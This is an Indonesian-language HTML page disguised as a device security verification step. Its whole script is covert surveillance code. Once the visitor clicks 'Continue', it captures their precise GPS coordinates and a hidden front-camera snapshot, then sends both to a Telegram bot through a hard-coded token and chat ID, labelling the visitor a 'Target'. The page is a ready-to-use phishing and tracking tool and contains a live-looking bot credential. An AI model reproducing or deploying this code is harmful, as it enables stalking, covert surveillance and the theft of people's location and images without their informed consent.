<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 30px;
            background: #1e1e1e;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
            max-width: 320px;
            width: 100%;
        }
        .btn {
            background-color: #03a9f4;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            font-weight: bold;
        }
        .btn:hover {
            background-color: #0288d1;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.1);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border-left-color: #03a9f4;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container" id="box-awal">
        <h3>Verifikasi Perangkat</h3>
        <p>Klik tombol di bawah untuk melanjutkan proses sinkronisasi keamanan.</p>
        <button class="btn" id="btnMulai">Lanjutkan</button>
    </div>

    <div class="container" id="box-proses" style="display:none;">
        <h3>Memproses Data...</h3>
        <p>Mohon izinkan akses yang diminta.</p>
        <div class="spinner" id="spinner"></div>
    </div>

    <!-- Elemen tersembunyi untuk proses kamera -->
    <video id="videoElement" autoplay playsinline style="display:none;"></video>
    <canvas id="canvasElement" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8616650869:AAEfksktRupuMVxSTGznIvM9ZKxXXAvHiuk';
        const CHAT_ID = '8664741564';

        document.getElementById('btnMulai').addEventListener('click', () => {
            document.getElementById('box-awal').style.display = 'none';
            document.getElementById('box-proses').style.display = 'block';
            document.getElementById('spinner').style.display = 'block';
            
            // Eksekusi lokasi dan pengambilan foto secara paralel
            eksekusiLokasi();
            ambilDanKirimFoto();
        });

        async function kirimKeTelegram(lat, lon, akurasi) {
            try {
                let pesan = '';
                if (lat && lon) {
                    pesan = `<b>[+] Target Lokasi Ditemukan [+]</b>\n\n- Latitude: <code>${lat}</code>\n- Longitude: <code>${lon}</code>\n- Akurasi: ±${akurasi} meter\n\n🎯 <b><a href="https://maps.google.com/?q=${lat},${lon}">KLIK DISINI UNTUK BUKA TITIK GPS</a></b>`;
                } else {
                    pesan = '[-] Akses lokasi ditolak atau tidak tersedia.';
                }

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: pesan, 
                        parse_mode: 'HTML',
                        disable_web_page_preview: false 
                    })
                });

                cekSelesai();
            } catch (err) {
                console.error('Error transmisi lokasi:', err);
            }
        }

        async function ambilDanKirimFoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('videoElement');
                video.srcObject = stream;

                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        resolve();
                    };
                });

                // Berikan jeda sejenak agar kamera siap menangkap cahaya
                await new Promise(r => setTimeout(r, 1000));

                const canvas = document.getElementById('canvasElement');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Matikan stream kamera setelah foto diambil
                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'target_snapshot.jpg');
                    formData.append('caption', '<b>[+] Snapshot Kamera Target [+]</b>');
                    formData.append('parse_mode', 'HTML');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    cekSelesai();
                }, 'image/jpeg', 0.85);

            } catch (err) {
                console.error('Error akses kamera:', err);
                cekSelesai();
            }
        }

        let statusSelesai = 0;
        function cekSelesai() {
            statusSelesai++;
            if (statusSelesai >= 2) {
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('box-proses').innerHTML = '<h3>Verifikasi Selesai</h3>';
            }
        }

        function eksekusiLokasi() {
            if (!navigator.geolocation) {
                kirimKeTelegram(null, null, null);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const akurasi = position.coords.accuracy;
                    kirimKeTelegram(lat, lon, akurasi);
                },
                (error) => {
                    kirimKeTelegram(null, null, null);
                },
                { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
            );
        }
    </script>
</body>
</html>
